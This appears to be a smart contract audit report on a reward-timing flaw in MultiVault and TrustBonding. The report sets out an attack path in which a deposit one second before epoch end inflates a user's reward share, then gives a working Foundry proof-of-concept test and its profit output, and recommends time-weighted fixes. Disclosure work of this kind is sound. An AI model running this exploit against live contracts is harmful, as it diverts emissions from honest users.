  "body": "### Finding Description and Impact\n\nPersonal utilization for rewards is derived from epoch-to-epoch utilization deltas without time weighting or minimum holding duration. As a result, utilization added immediately before epoch end is treated as if it represented meaningful epoch participation.\n\nThis how the vulneralbility arises :\n\n1. Attacker performs a boundary deposit right before epoch end `e`.\n   - `deposit()` adds utilization using full `msg.value` before reward calculations:\n```solidity\n// src/protocol/MultiVault.sol:676-679\n_addUtilization(receiver, int256(msg.value));\nreturn _processDeposit(msg.sender, receiver, termId, curveId, msg.value, minShares);\n```\n\n2. Utilization is written directly into current epoch buckets.\n```solidity\n// src/protocol/MultiVault.sol:1488-1492\ntotalUtilization[epoch] += totalValue;\npersonalUtilization[user][epoch] += totalValue;\n```\n\n3. At epoch transition, rollover preserves prior epoch exposure snapshots and supports boundary sensitivity.\n```solidity\n// src/protocol/MultiVault.sol:1531-1534, 1544-1547\ntotalUtilization[currentEpochLocal] = totalUtilization[previousEpoch];\n...\npersonalUtilization[user][currentEpochLocal] = lastEpochUtilization;\n```\n\n4. In epoch `e+1`, claim logic always targets `prevEpoch = e`.\n```solidity\n// src/protocol/emissions/TrustBonding.sol:361-371\nuint256 prevEpoch = currentEpochLocal - 1;\nuint256 rawUserRewards = _userEligibleRewardsForEpoch(msg.sender, prevEpoch);\nuint256 personalUtilizationRatio = _getPersonalUtilizationRatio(msg.sender, prevEpoch);\nuint256 userRewards = rawUserRewards * personalUtilizationRatio / BASIS_POINTS_DIVISOR;\n```\n\n5. Personal utilization ratio is driven by epoch delta, not hold time.\n```solidity\n// src/protocol/emissions/TrustBonding.sol:509-514, 537-539\nint256 userUtilizationBefore = IMultiVault(multiVault).getUserUtilizationInEpoch(_account, _epoch - 1);\nint256 userUtilizationAfter = IMultiVault(multiVault).getUserUtilizationInEpoch(_account, _epoch);\nint256 rawUtilizationDelta = userUtilizationAfter - userUtilizationBefore;\n...\nif (userUtilizationDelta >= userUtilizationTarget) {\n    return BASIS_POINTS_DIVISOR; // 100%\n}\n```\n\n6. `userUtilizationTarget` is last epoch claimed rewards, allowing large one-epoch jumps to max ratio.\n```solidity\n// src/protocol/emissions/TrustBonding.sol:524\nuint256 userUtilizationTarget = userClaimedRewardsForEpoch[_account][_epoch - 1];\n```\n\n7. Attacker exits shortly after claim; removal impacts current epoch (`e+1`) accounting, not already-claimed epoch `e`.\n```solidity\n// src/protocol/MultiVault.sol:836-839\n(uint256 rawAssetsBeforeFees, uint256 assetsAfterFees) = _processRedeem(...);\n_removeUtilization(receiver, int256(rawAssetsBeforeFees));\n```\n\n8. Net effect:\n   - Epoch `e` claim remains boosted from boundary deposit.\n   - Round-trip cost is mostly fees/slippage paid on unwind in epoch `e+1`.\n   - In one run, reward differential already exceeds realized unwind cost.\n\nAttack path :\n\n1. Attacker keeps baseline stake comparable to passive users.\n2. At `epochTimestampEnd(e) - 1`, attacker makes a temporary deposit to increase personal utilization for epoch `e`.\n3. In epoch `e+1`, attacker calls `claimRewards` and receives boosted rewards for epoch `e`.\n4. Attacker exits the temporary position shortly after boundary.\n5. PoC demonstrates one-run impact using this boundary method.\n\nTimeline example :\n\n1. End of epoch `e`: attacker deposits to inflate `personalUtilization[user][e]`.\n2. Start of epoch `e+1`: attacker calls `claimRewards`, which computes rewards for epoch `e`.\n3. Same epoch `e+1`: attacker redeems temporary position and realizes bounded trading/fee loss.\n4. Result: reward delta from boosted ratio can exceed realized unwind loss\n\nThe impact because of this issue are inflated reward capture by boundary-timing users, dilution of honest users who do not run the timing strategy and extraction pressure on emissions distribution from boundary-timing behavior.\n\n### Recommended Mitigation Steps\n\nPreferred fix:\n  - In `MultiVault`, track cumulative `utilization * time` for each user and for the system, settling the accumulator on every `_addUtilization(...)`, `_removeUtilization(...)`, and epoch rollover.\n  - In `TrustBonding._getPersonalUtilizationRatio(...)`, replace the current end-of-epoch snapshot delta with the delta between consecutive epoch-average utilizations.\n  - This keeps the existing “increase usage relative to last epoch” design, but removes the ability for a one-second boundary deposit to count like a full-epoch contribution.\n\nSimpler safe fallback if a full integral is too invasive:\n  - make utilization added in epoch `e` ineligible for epoch `e` rewards and only count it starting in epoch `e+1`,\n  - or enforce a minimum in-epoch residency before new utilization is included in the ratio path.",
  "proof_of_concept": "### Proof of Concept\n\nadd a test in `PoCCore.t.sol` and run `forge test --match-contract PoCCore --match-test submissionValidity -vv` \n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { console2 } from \"forge-std/src/console2.sol\";\nimport { BaseTest } from \"./BaseTest.t.sol\";\nimport { AtomConfig, VaultFees } from \"src/interfaces/IMultiVaultCore.sol\";\n\ncontract PoCCore is BaseTest {\n    struct OneRun {\n        address attacker;\n        address honest;\n        bytes32 atomId;\n        uint256 curveId;\n        uint256 unlockTime;\n        uint256 currentEpoch;\n        uint256 boundaryDeposit;\n        uint256 shares;\n        uint256 epochEnd;\n        uint256 balBefore;\n        uint256 attackerClaim;\n        uint256 honestClaim;\n        uint256 redeemedAssets;\n        uint256 loss;\n        uint256 delta;\n        uint256 netProfit;\n    }\n\n    function test_submissionValidity()\n        external\n        // Add modifiers from BaseTest / Modifiers as needed for setup (e.g. onlyAdmin, onlyUser)\n    {\n        OneRun memory v;\n        vm.deal(address(protocol.satelliteEmissionsController), 10_000_000 ether);\n\n        // Align to deployment defaults from SetupScript.\n        resetPrank(users.admin);\n        protocol.multiVault.setVaultFees(VaultFees({ entryFee: 50, exitFee: 75, protocolFee: 125 }));\n\n        AtomConfig memory atomConfig = protocol.multiVault.getAtomConfig();\n        atomConfig.atomWalletDepositFee = 50;\n        resetPrank(users.admin);\n        protocol.multiVault.setAtomConfig(atomConfig);\n\n        resetPrank(users.timelock);\n        protocol.trustBonding.updatePersonalUtilizationLowerBound(2500);\n\n        v.attacker = users.alice;\n        v.honest = users.bob;\n\n        // Equal starting stake for attacker and honest user.\n        vm.startPrank(v.attacker);\n        v.unlockTime = block.timestamp + 2 * 365 days;\n        protocol.wrappedTrust.approve(address(protocol.trustBonding), 10_000 ether);\n        protocol.trustBonding.create_lock(10_000 ether, v.unlockTime);\n        vm.stopPrank();\n\n        vm.startPrank(v.honest);\n        protocol.wrappedTrust.approve(address(protocol.trustBonding), 10_000 ether);\n        protocol.trustBonding.create_lock(10_000 ether, v.unlockTime);\n        vm.stopPrank();\n\n        // Create one atom used for boundary deposit/redeem manipulation.\n        bytes memory atomData = bytes(\"utilization-probe-atom\");\n        bytes[] memory atomDataArray = new bytes[](1);\n        atomDataArray[0] = atomData;\n        createAtomsWithUniformCost(atomDataArray, protocol.multiVault.getAtomCost(), users.admin);\n        v.atomId = calculateAtomId(atomData);\n        v.curveId = getDefaultCurveId();\n\n        // Prime baseline claims so epoch-2 differential is measurable.\n        v.currentEpoch = protocol.trustBonding.currentEpoch();\n        if (1 > v.currentEpoch) {\n            vm.warp(block.timestamp + (1 - v.currentEpoch) * protocol.trustBonding.epochLength());\n        }\n        resetPrank(v.attacker);\n        protocol.trustBonding.claimRewards(v.attacker);\n        resetPrank(v.honest);\n        protocol.trustBonding.claimRewards(v.honest);\n\n        v.currentEpoch = protocol.trustBonding.currentEpoch();\n        if (2 > v.currentEpoch) {\n            vm.warp(block.timestamp + (2 - v.currentEpoch) * protocol.trustBonding.epochLength());\n        }\n        resetPrank(v.attacker);\n        protocol.trustBonding.claimRewards(v.attacker);\n        resetPrank(v.honest);\n        protocol.trustBonding.claimRewards(v.honest);\n\n        // One-run boundary manipulation\n        v.boundaryDeposit = protocol.trustBonding.userClaimedRewardsForEpoch(v.attacker, 1);\n        v.epochEnd = protocol.trustBonding.epochTimestampEnd(2);\n        vm.warp(v.epochEnd - 1);\n        v.shares = makeDeposit(v.attacker, v.attacker, v.atomId, v.curveId, v.boundaryDeposit, 0);\n\n        // In next epoch, both claim rewards for epoch 2.\n        vm.warp(v.epochEnd + 1);\n        v.balBefore = v.attacker.balance;\n        resetPrank(v.attacker);\n        protocol.trustBonding.claimRewards(v.attacker);\n        v.attackerClaim = v.attacker.balance - v.balBefore;\n\n        v.balBefore = v.honest.balance;\n        resetPrank(v.honest);\n        protocol.trustBonding.claimRewards(v.honest);\n        v.honestClaim = v.honest.balance - v.balBefore;\n\n        // Attacker exits immediately after capturing boosted rewards.\n        v.balBefore = v.attacker.balance;\n        v.redeemedAssets = redeemShares(v.attacker, v.attacker, v.atomId, v.curveId, v.shares, 0);\n        assertEq(v.attacker.balance - v.balBefore, v.redeemedAssets, \"redeem transfer mismatch\");\n\n        v.loss = v.boundaryDeposit - v.redeemedAssets;\n        v.delta = v.attackerClaim - v.honestClaim;\n        v.netProfit = v.delta - v.loss;\n\n        assertGt(v.attackerClaim, v.honestClaim, \"attacker should claim more than honest user\");\n        assertGt(v.loss, 0, \"one-run manipulation should realize non-zero unwind loss\");\n        assertGt(v.delta, v.loss, \"reward uplift should exceed realized unwind loss\");\n\n        console2.log(\"oneRun.boundaryDeposit\", v.boundaryDeposit);\n        console2.log(\"oneRun.loss\", v.loss);\n        console2.log(\"oneRun.delta\", v.delta);\n        console2.log(\"oneRun.attackerClaim\", v.attackerClaim);\n        console2.log(\"oneRun.honestClaim\", v.honestClaim);\n        console2.log(\"oneRun.AttackerNetProfit\", v.netProfit);\n    }\n}\n\n```\n\nResult :\n\n```solidity\ntest_submissionValidity() (gas: 1842200)\nLogs:\n  MultiVault implementation address:  0xF62849F9A0B5Bf2913b396098F7c7019b51A820a\n  MultiVault proxy address:  0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9\n  AtomWallet implementation deployed at: 0xc7183455a4C133Ae270771860664b6B7ec320bB1\n  AtomWalletBeacon deployed at: 0xa0Cb889707d426A7A386870A03bc70d1b0697598\n  AtomWalletFactory implementation address:  0x1d1499e622D69689cdf9004d05Ec547d650Ff211\n  AtomWalletFactory proxy address:  0xA4AD4f68d0b91CFD19687c881e50f3A00242828c\n  WrappedTrust address:  0x03A6a84cD762D9707A21605b548aaaB891562aAb\n  TrustBonding implementation address:  0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF\n  TrustBonding proxy address:  0x15cF58144EF33af1e14b5208015d11F9143E27b9\n  SatelliteEmissionsController Implementation 0x212224D2F2d262cd093eE13240ca4873fcCBbA3C\n  SatelliteEmissionsController Proxy 0x2a07706473244BC757E10F2a9E86fB532828afe3\n  BondingCurveRegistry address:  0xD16d567549A2a2a2005aEACf7fB193851603dd70\n  LinearCurve address:  0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f\n  OffsetProgressiveCurve address:  0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6\n  ProgressiveCurve address:  0x756e0562323ADcDA4430d6cb456d9151f605290B\n  Added LinearCurve to registry with ID: 1\n  Added OffsetProgressiveCurve to registry with ID: 2\n  Added ProgressiveCurve to registry with ID: 3\n  oneRun.boundaryDeposit 500000000000000000000\n  oneRun.loss 14890625000000000000\n  oneRun.delta 281250000000000000000\n  oneRun.attackerClaim 375000000000000000000\n  oneRun.honestClaim 93750000000000000000\n  oneRun.AttackerNetProfit 266359375000000000000\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 25.54ms (3.02ms CPU time)\n\nRan 1 test suite in 156.79ms (25.54ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nPoC Explanation :\n\nThis PoC is a single-run differential test between:\n- attacker: performs one boundary-timed deposit before epoch end, then claims and exits\n- honest user: keeps the same lock baseline but does not run boundary timing\n\nStep-by-step:\n1. Set deployment-style default params in-test (`entry=50`, `exit=75`, `protocol=125`, `atomWalletDepositFee=50`, `personal floor=2500`).\n2. Create equal veTRUST locks for attacker and honest user.\n3. Prime baseline claims through epoch 1 and epoch 2 so both users have the same claim history baseline.\n4. At `epochTimestampEnd(2)-1`, attacker performs one temporary boundary deposit.\n5. Move to epoch 3, both users call `claimRewards` for epoch 2.\n6. Attacker immediately redeems the temporary position and realizes unwind cost.\n7. Compare differential and enforce:\n   - attacker claim > honest claim\n   - loss > 0\n   - delta > loss\n\nWhat this PoC proves\n1. **Attacker-vs-honest differential exists under equal starting stake.**\n   - Both users start with the same lock profile, but only the attacker performs boundary deposit timing.\n   - Outcome in this run: attacker claim (`375e18`) is materially higher than honest claim (`93.75e18`).\n2. **Manipulation is not “free”; it pays real unwind cost.**\n   - The attacker incurs a realized round-trip loss (`14.890625e18`) when redeeming shortly after claim.\n3. **Net reward advantage exceeds realized cost in a single run.**\n   - Differential reward uplift (`281.25e18`) is greater than unwind loss (`14.890625e18`).",
